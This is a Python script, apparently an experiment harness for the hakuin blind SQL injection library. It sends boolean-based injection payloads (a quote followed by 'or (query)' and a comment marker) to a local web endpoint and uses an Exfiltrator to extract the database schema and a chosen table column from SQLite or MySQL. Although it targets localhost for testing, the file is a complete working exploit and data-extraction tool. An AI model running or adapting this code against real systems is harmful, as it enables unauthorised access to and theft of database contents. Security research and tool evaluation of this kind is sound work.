import json
import logging
import requests
import sys

from hakuin.dbms import SQLite, MySQL
from hakuin import Exfiltrator, Requester



logging.basicConfig(level=logging.INFO)



class R(Requester):
    def __init__(self, dbms):
        self.dbms = dbms


    def request(self, ctx, query):
        if self.dbms == 'sqlite':
            url = f'http://127.0.0.1:8000/large_content?name=NONEXISTANT" or ({query}) --'
        else:
            url = f'http://127.0.0.1:8000/large_content?name=NONEXISTANT" or ({query}) %23'

        r = requests.get(url)
        assert r.status_code in [200, 404], f'Unexpected resposne code: {r.status_code}'
        return r.status_code == 200



def main():
    assert len(sys.argv) == 4, 'python3 experiment_generic_db.py <dbms> <table> <column>'
    _, dbms_type, table, column = sys.argv
    assert dbms_type in ['sqlite', 'mysql'], f'dbms must be in ["sqlite", "mysql"]'

    requester = R(dbms_type)
    dbms = SQLite() if dbms_type == 'sqlite' else MySQL()
    exf = Exfiltrator(requester, dbms)

    res = exf.exfiltrate_schema(mode='model_search', metadata=True)
    print(json.dumps(res, indent=4))
    res = exf.exfiltrate_text_data(table, column)
    print(json.dumps(res, indent=4))



if __name__ == '__main__':
    main()
